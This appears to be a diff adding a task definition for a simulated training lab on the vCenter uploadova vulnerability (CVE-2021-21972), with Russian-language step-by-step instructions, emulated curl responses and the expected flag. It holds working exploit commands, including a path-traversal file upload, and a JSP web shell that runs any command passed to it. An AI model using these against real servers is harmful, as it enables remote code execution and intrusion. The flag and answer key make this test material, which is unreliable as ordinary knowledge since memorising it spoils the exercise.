@@ -1,0 +1,51 @@
+{
+  "id": "web-vcenter",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{vspher3_cl13nt_upload0va_t0_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: vCenter uploadova (CVE-2021-21972)\n\nЦель: `https://vcenter.local`. Уязвим плагин vROPS.\n\n1. Определи версию:\n   curl -s -k https://vcenter.local/sdk/vimServiceVersions.xml\n\n2. Проверь уязвимый эндпоинт (должен ответить 200 без логина):\n   curl -s -k -o /dev/null -w '%{http_code}\\n' https://vcenter.local/ui/vropspluginui/rest/services/uploadova\n\n3. Загрузи безобидный JSP-шелл (файл shell.jsp уже в каталоге):\n   curl -s -k -X POST 'https://vcenter.local/ui/vropspluginui/rest/services/uploadova' -F 'uploadFile=@shell.jsp;filename=../../../../home/vsphere-ui/plugin/shell.jsp'\n\n4. Выполни команду через загруженный шелл:\n   curl -s -k 'https://vcenter.local/ui/vropspluginui/rest/services/shell.jsp?cmd=id'\n\n5. В выводе — флаг. Сохрани в found.txt и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/shell.jsp",
+      "text": "<%@ page import=\"java.util.*,java.io.*\"%>\n<% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n   String l; while ((l = r.readLine()) != null) out.println(l); %>\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vcenter.local)",
+      "cases": [
+        {
+          "match": "shell\\.jsp\\?cmd|shell\\.jsp",
+          "example": "-s -k 'https://vcenter.local/ui/vropspluginui/rest/services/shell.jsp?cmd=id'",
+          "output": "uid=1000(vsphere-ui) gid=1000(vsphere-ui) groups=1000(vsphere-ui)\nnto{vspher3_cl13nt_upload0va_t0_rce}\n"
+        },
+        {
+          "match": "uploadova",
+          "example": "-s -k -X POST 'https://vcenter.local/ui/vropspluginui/rest/services/uploadova' -F 'uploadFile=@shell.jsp;filename=../../..'",
+          "output": "200 OK\n"
+        },
+        {
+          "match": "vimServiceVersions",
+          "example": "-s -k https://vcenter.local/sdk/vimServiceVersions.xml",
+          "output": "<?xml version=\"1.0\"?>\n<namespaces version=\"1.0\">\n  <namespace>urn:vim25</namespace>\n  <version>6.7.0</version>\n</namespaces>\n"
+        },
+        {
+          "match": "vcenter\\.local/?$|vcenter\\.local'?$",
+          "example": "-s -k https://vcenter.local/",
+          "output": "<html><head><title>VMware vSphere Client</title></head><body>Loading...</body></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только vcenter.local"
+    }
+  }
+}
